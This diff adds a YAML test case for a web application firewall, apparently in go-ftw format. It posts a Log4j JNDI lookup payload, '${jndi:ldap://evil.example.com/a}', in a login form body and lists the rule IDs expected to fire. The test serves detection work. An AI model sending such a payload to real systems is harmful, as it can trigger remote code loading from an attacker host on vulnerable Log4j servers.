@@ -1,0 +1,18 @@
+# TR-07b corpus case (go-ftw shape) — source: live probe matrix
+# (probe against the committed engine.conf; see README delta table).
+name: 12-log4j-form
+surface: "log4j JNDI lookup in form body"
+request:
+  method: "POST"
+  uri: "/login"
+  version: "1.1"
+  headers:
+    Host: "trishula.local"
+    Content-Type: "application/x-www-form-urlencoded"
+  body: "u=${jndi:ldap://evil.example.com/a}"
+expect:
+  # engine-mirror-noise pin (setup + threshold echoes; README).
+  phase1_pinned: [900000, 900110, 900990]
+  phase2_seed: [944150, 944151, 944152]
+  # observed off-seed attack ids (live probe evidence, README table).
+  phase2_offseed: [942431, 942432]
